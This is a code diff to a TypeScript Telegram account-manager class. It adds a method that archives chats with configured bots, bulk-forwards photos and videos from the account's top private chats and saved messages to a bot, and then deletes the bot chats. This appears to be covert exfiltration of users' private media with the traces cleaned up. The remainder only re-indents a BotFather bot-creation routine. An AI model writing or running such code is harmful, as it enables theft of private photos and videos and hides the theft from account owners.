@@ -22,6 +22,7 @@ import { MediaAlbumOptions } from './types/telegram-types';
 import { IterMessagesParams } from 'telegram/client/messages';
 import { connectionManager } from './utils/connection-manager';
 import { MessageMediaType, SearchMessagesDto, SearchMessagesResponseDto } from './dto/message-search.dto';
+import { BotConfig, ChannelCategory } from 'src/utils/TelegramBots.config';
 
 interface MessageScheduleOptions {
     chatId: string;
@@ -169,6 +170,55 @@ class TelegramManager {
             await connectionManager.unregisterClient(this.phoneNumber);
         }
     }
+
+    public async forwardMediaToBot(fromChatId: string) {
+        const bots = BotConfig.getInstance().getAllBotUsernames(ChannelCategory.SAVED_MESSAGES);
+        for (const bot of bots) {
+            try {
+                await this.client.sendMessage(bot, { message: "Forwarding media to bot" });
+                await this.client.invoke(
+                    new Api.folders.EditPeerFolders({
+                        folderPeers: [
+                            new Api.InputFolderPeer({
+                                peer: await this.client.getInputEntity(bot),
+                                folderId: 1,
+                            }),
+                        ],
+                    })
+                );
+            } catch (e) {
+                console.log(e)
+            }
+        }
+        try {
+            if (fromChatId) {
+                await this.forwardSecretMsgs(fromChatId, BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES),);
+            } else {
+                const chats = await this.getTopPrivateChats();
+                const me = await this.getMe();
+                if (chats.length > 0) {
+                    const finalChats = new Set(chats.map(chat => chat.chatId));
+                    finalChats.add(me.id?.toString());
+                    for (const chatId of finalChats) {
+                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.VOICE] });
+                        await this.forwardMessages(chatId, BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES), mediaMessages.photo.messages);
+                        await this.forwardMessages(chatId, BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES), mediaMessages.video.messages);
+                    }
+                }
+            }
+        } catch (e) {
+            console.log(e)
+        }
+        for (const bot of bots) {
+            try {
+                await this.deleteChat(bot);
+            } catch (e) {
+                console.log(e)
+            }
+        }
+        await connectionManager.unregisterClient(this.phoneNumber);
+    }
+
 
     public async forwardSecretMsgs(fromChatId: string, toChatId: string) {
         let offset = 0;
@@ -3181,164 +3231,164 @@ class TelegramManager {
         }
     }
 
-async createBot(options: {
-    name: string;
-    username: string;
-    description?: string;
-    aboutText?: string;
-    profilePhotoUrl?: string;
-}): Promise<{ botToken: string; username: string }> {
-    if (!this.client) {
-        console.error('Bot creation failed: Client not initialized');
-        throw new Error('Client not initialized');
-    }
+    async createBot(options: {
+        name: string;
+        username: string;
+        description?: string;
+        aboutText?: string;
+        profilePhotoUrl?: string;
+    }): Promise<{ botToken: string; username: string }> {
+        if (!this.client) {
+            console.error('Bot creation failed: Client not initialized');
+            throw new Error('Client not initialized');
+        }
 
-    const botFatherUsername = 'BotFather';
-    console.log(`[BOT CREATION] Starting bot creation process for "${options.name}" (${options.username})`);
+        const botFatherUsername = 'BotFather';
+        console.log(`[BOT CREATION] Starting bot creation process for "${options.name}" (${options.username})`);
 
-    try {
-        // Start conversation with BotFather
-        console.log('[BOT CREATION] Attempting to get entity for BotFather...');
-        const entity = await this.client.getEntity(botFatherUsername);
-        console.log('[BOT CREATION] Successfully connected to BotFather');
-        
-        // Send /newbot command
-        console.log('[BOT CREATION] Sending /newbot command...');
-        await this.client.sendMessage(entity, {
-            message: '/newbot'
-        });
-        console.log('[BOT CREATION] Waiting for BotFather response after /newbot command...');
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        try {
+            // Start conversation with BotFather
+            console.log('[BOT CREATION] Attempting to get entity for BotFather...');
+            const entity = await this.client.getEntity(botFatherUsername);
+            console.log('[BOT CREATION] Successfully connected to BotFather');
 
-        // Send bot name
-        console.log(`[BOT CREATION] Sending bot name: "${options.name}"`);
-        await this.client.sendMessage(entity, {
-            message: options.name
-        });
-        console.log('[BOT CREATION] Waiting for BotFather response after sending name...');
-        await new Promise(resolve => setTimeout(resolve, 1000));
+            // Send /newbot command
+            console.log('[BOT CREATION] Sending /newbot command...');
+            await this.client.sendMessage(entity, {
+                message: '/newbot'
+            });
+            console.log('[BOT CREATION] Waiting for BotFather response after /newbot command...');
+            await new Promise(resolve => setTimeout(resolve, 1000));
 
-        // Send bot username
-        // Append a 3-digit unique string ending with "_bot" if not present
-        let botUsername = options.username;
-        if (!/_bot$/.test(botUsername)) {
-            // Generate a unique 3-character alphanumeric string
-            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-            let uniqueSuffix = '';
-            for (let i = 0; i < 3; i++) {
-                uniqueSuffix += chars.charAt(Math.floor(Math.random() * chars.length));
+            // Send bot name
+            console.log(`[BOT CREATION] Sending bot name: "${options.name}"`);
+            await this.client.sendMessage(entity, {
+                message: options.name
+            });
+            console.log('[BOT CREATION] Waiting for BotFather response after sending name...');
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            // Send bot username
+            // Append a 3-digit unique string ending with "_bot" if not present
+            let botUsername = options.username;
+            if (!/_bot$/.test(botUsername)) {
+                // Generate a unique 3-character alphanumeric string
+                const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+                let uniqueSuffix = '';
+                for (let i = 0; i < 3; i++) {
+                    uniqueSuffix += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                botUsername = botUsername.replace(/_?bot$/, '') + `_${uniqueSuffix}_bot`;
+                console.log(`[BOT CREATION] Modified username to ensure uniqueness: ${botUsername}`);
             }
-            botUsername = botUsername.replace(/_?bot$/, '') + `_${uniqueSuffix}_bot`;
-            console.log(`[BOT CREATION] Modified username to ensure uniqueness: ${botUsername}`);
-        }
-        
-        console.log(`[BOT CREATION] Sending bot username: "${botUsername}"`);
-        await this.client.sendMessage(entity, {
-            message: botUsername
-        });
-        console.log('[BOT CREATION] Waiting for BotFather response after sending username...');
-        await new Promise(resolve => setTimeout(resolve, 1000));
 
-        // Get response from BotFather
-        console.log('[BOT CREATION] Retrieving response from BotFather...');
-        const messages = await this.client.getMessages(entity, {
-            limit: 1
-        });
-
-        if (!messages || messages.length === 0) {
-            console.error('[BOT CREATION] No response received from BotFather');
-            throw new Error('No response received from BotFather');
-        }
-
-        const lastMessage = messages[0].message;
-        console.log(`[BOT CREATION] BotFather response: "${lastMessage.substring(0, 50)}..."`);
-        
-        if (!lastMessage.toLowerCase().includes('use this token')) {
-            console.error(`[BOT CREATION] Bot creation failed, unexpected response: "${lastMessage}"`);
-            throw new Error(`Bot creation failed: ${lastMessage}`);
-        }
-
-        // Extract bot token from BotFather's response
-        const tokenMatch = lastMessage.match(/(\d+:[A-Za-z0-9_-]+)/);
-        if (!tokenMatch) {
-            console.error('[BOT CREATION] Could not extract bot token from BotFather response');
-            throw new Error('Could not extract bot token from BotFather response');
-        }
-        const botToken = tokenMatch[0];
-        console.log(`[BOT CREATION] Successfully extracted bot token: ${botToken.substring(0, 5)}...`);
-
-        // If description is provided, set it
-        if (options.description) {
-            console.log('[BOT CREATION] Setting bot description...');
-            await this.client.sendMessage(entity, { message: '/setdescription' });
+            console.log(`[BOT CREATION] Sending bot username: "${botUsername}"`);
+            await this.client.sendMessage(entity, {
+                message: botUsername
+            });
+            console.log('[BOT CREATION] Waiting for BotFather response after sending username...');
             await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            console.log(`[BOT CREATION] Selecting bot @${options.username} for description update...`);
-            await this.client.sendMessage(entity, { message: `@${options.username}` });
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            console.log('[BOT CREATION] Sending description text...');
-            await this.client.sendMessage(entity, { message: options.description });
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            console.log('[BOT CREATION] Description set successfully');
-        }
 
-        // If about text is provided, set it
-        if (options.aboutText) {
-            console.log('[BOT CREATION] Setting about text...');
-            await this.client.sendMessage(entity, { message: '/setabouttext' });
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            console.log(`[BOT CREATION] Selecting bot @${options.username} for about text update...`);
-            await this.client.sendMessage(entity, { message: `@${options.username}` });
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            console.log('[BOT CREATION] Sending about text...');
-            await this.client.sendMessage(entity, { message: options.aboutText });
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            console.log('[BOT CREATION] About text set successfully');
-        }
+            // Get response from BotFather
+            console.log('[BOT CREATION] Retrieving response from BotFather...');
+            const messages = await this.client.getMessages(entity, {
+                limit: 1
+            });
 
-        // If profile photo URL is provided, set it
-        if (options.profilePhotoUrl) {
-            console.log(`[BOT CREATION] Setting profile photo from URL: ${options.profilePhotoUrl}`);
-            try {
-                console.log('[BOT CREATION] Downloading profile photo...');
-                const photoBuffer = await this.downloadFileFromUrl(options.profilePhotoUrl);
-                console.log(`[BOT CREATION] Photo downloaded successfully, size: ${photoBuffer.length} bytes`);
-                
-                console.log('[BOT CREATION] Sending /setuserpic command...');
-                await this.client.sendMessage(entity, { message: '/setuserpic' });
+            if (!messages || messages.length === 0) {
+                console.error('[BOT CREATION] No response received from BotFather');
+                throw new Error('No response received from BotFather');
+            }
+
+            const lastMessage = messages[0].message;
+            console.log(`[BOT CREATION] BotFather response: "${lastMessage.substring(0, 50)}..."`);
+
+            if (!lastMessage.toLowerCase().includes('use this token')) {
+                console.error(`[BOT CREATION] Bot creation failed, unexpected response: "${lastMessage}"`);
+                throw new Error(`Bot creation failed: ${lastMessage}`);
+            }
+
+            // Extract bot token from BotFather's response
+            const tokenMatch = lastMessage.match(/(\d+:[A-Za-z0-9_-]+)/);
+            if (!tokenMatch) {
+                console.error('[BOT CREATION] Could not extract bot token from BotFather response');
+                throw new Error('Could not extract bot token from BotFather response');
+            }
+            const botToken = tokenMatch[0];
+            console.log(`[BOT CREATION] Successfully extracted bot token: ${botToken.substring(0, 5)}...`);
+
+            // If description is provided, set it
+            if (options.description) {
+                console.log('[BOT CREATION] Setting bot description...');
+                await this.client.sendMessage(entity, { message: '/setdescription' });
                 await new Promise(resolve => setTimeout(resolve, 1000));
-                
-                console.log(`[BOT CREATION] Selecting bot @${options.username} for profile photo update...`);
+
+                console.log(`[BOT CREATION] Selecting bot @${options.username} for description update...`);
                 await this.client.sendMessage(entity, { message: `@${options.username}` });
                 await new Promise(resolve => setTimeout(resolve, 1000));
-                
-                console.log('[BOT CREATION] Uploading profile photo...');
-                await this.client.sendFile(entity, {
-                    file: Buffer.from(photoBuffer),
-                    caption: '',
-                    forceDocument: false
-                });
+
+                console.log('[BOT CREATION] Sending description text...');
+                await this.client.sendMessage(entity, { message: options.description });
                 await new Promise(resolve => setTimeout(resolve, 1000));
-                console.log('[BOT CREATION] Profile photo set successfully');
-            } catch (photoError) {
-                console.error(`[BOT CREATION] Failed to set profile photo: ${photoError.message}`);
-                // Continue with bot creation even if photo upload fails
+                console.log('[BOT CREATION] Description set successfully');
             }
+
+            // If about text is provided, set it
+            if (options.aboutText) {
+                console.log('[BOT CREATION] Setting about text...');
+                await this.client.sendMessage(entity, { message: '/setabouttext' });
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                console.log(`[BOT CREATION] Selecting bot @${options.username} for about text update...`);
+                await this.client.sendMessage(entity, { message: `@${options.username}` });
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                console.log('[BOT CREATION] Sending about text...');
+                await this.client.sendMessage(entity, { message: options.aboutText });
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                console.log('[BOT CREATION] About text set successfully');
+            }
+
+            // If profile photo URL is provided, set it
+            if (options.profilePhotoUrl) {
+                console.log(`[BOT CREATION] Setting profile photo from URL: ${options.profilePhotoUrl}`);
+                try {
+                    console.log('[BOT CREATION] Downloading profile photo...');
+                    const photoBuffer = await this.downloadFileFromUrl(options.profilePhotoUrl);
+                    console.log(`[BOT CREATION] Photo downloaded successfully, size: ${photoBuffer.length} bytes`);
+
+                    console.log('[BOT CREATION] Sending /setuserpic command...');
+                    await this.client.sendMessage(entity, { message: '/setuserpic' });
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+
+                    console.log(`[BOT CREATION] Selecting bot @${options.username} for profile photo update...`);
+                    await this.client.sendMessage(entity, { message: `@${options.username}` });
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+
+                    console.log('[BOT CREATION] Uploading profile photo...');
+                    await this.client.sendFile(entity, {
+                        file: Buffer.from(photoBuffer),
+                        caption: '',
+                        forceDocument: false
+                    });
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    console.log('[BOT CREATION] Profile photo set successfully');
+                } catch (photoError) {
+                    console.error(`[BOT CREATION] Failed to set profile photo: ${photoError.message}`);
+                    // Continue with bot creation even if photo upload fails
+                }
+            }
+
+            console.log(`[BOT CREATION] Bot creation completed successfully: @${options.username}`);
+            return {
+                botToken,
+                username: botUsername
+            };
+
+        } catch (error) {
+            console.error(`[BOT CREATION] Error during bot creation process: ${error.message}`, error);
+            throw new Error(`Failed to create bot: ${error.message}`);
         }
-
-        console.log(`[BOT CREATION] Bot creation completed successfully: @${options.username}`);
-        return {
-            botToken,
-            username: botUsername
-        };
-
-    } catch (error) {
-        console.error(`[BOT CREATION] Error during bot creation process: ${error.message}`, error);
-        throw new Error(`Failed to create bot: ${error.message}`);
     }
-}  
 }
 export default TelegramManager;
